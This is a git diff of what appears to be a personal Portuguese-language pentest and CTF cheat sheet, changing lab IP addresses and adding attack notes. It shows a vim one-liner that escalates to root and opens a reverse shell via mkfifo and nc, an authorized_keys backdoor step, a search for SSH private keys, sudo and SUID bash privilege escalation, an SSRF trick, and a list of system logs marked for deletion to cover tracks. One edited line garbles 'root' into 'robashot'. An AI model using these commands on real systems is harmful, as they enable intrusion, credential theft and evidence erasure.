@@ -1,10 +1,10 @@
-my ip = 10.6.8.59
-ip machine = 10.10.70.220
+my ip = 10.13.5.195
+ip machine = 10.10.243.145
 
 
 
 
-I Love XPSec!!!
+I Love Hacking!!!
 
 
 
@@ -247,7 +247,7 @@ cat <user>.pub > .ssh/authorized_keys   #autorizar nossa chave ssh
 ssh -i <privatekeygeradacomonomedousuariogeralmente> <user>@<ip>   #acessar por fim a máquina atacada
 
 vim.basic -c ':py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f")'   #shell com vim
-vim.basic -c ': py3 import os; os.setuid (0); os.execl ("/ bin / sh", "sh", "-c", "reset; exec sh") '  #alternativa ao comando de cima, podemos apenas pegar root na mesma sessão
+vim.basic -c ': py3 import os; os.setuid (0); os.execl ("/ bin / sh", "sh", "-c", "reset; exec sh") '  #alternativa ao comando de cima, podemos apenas pegar robashot na mesma sessão
 
 sudo service ../../bin/sh   #priv esc com sudo em service
 
@@ -255,7 +255,26 @@ http.request.method == <GET/POST/PUT...> #wireshark filtrar por metodo
 
 tcp.port == <porta>
 
+find / -name id_rsa 2> /dev/null #procurar por chaves ssh presentes na maquina alvo
 
+/var/log/auth.log 
+/var/log/syslog 
+/var/log/<algumserviçocomooapacheporexemplo>
+/var/log/apache2/access.log   #logs interessantes para se apagar ao fazer um pestest
+  
+bash -p #caso o bash seja um suid, no caso que possamos executar ele, mas ele pertença ao root
+
+
+r2 -d ./file    #usar o disassembler r2
+aa  #flag para analisar
+afl | grep main      #ver funções que tenham main no nome
+pdf @main       #filtrar pela função main para ver a função em código assembly
+db 0x00400b55      #criar breakpoint
+dc   #para executar
+px @ rbp-0xc   #ver strings até o breakpoint que definimos
+dr   #mover para proxima instrução após o breakpoint
+
+http://<dominion>/proxy=<ssrf>.localtest.me    #acessar localhost de uma aplciação, esse localtest.me é um dominio feito para testar isso
 
 
 
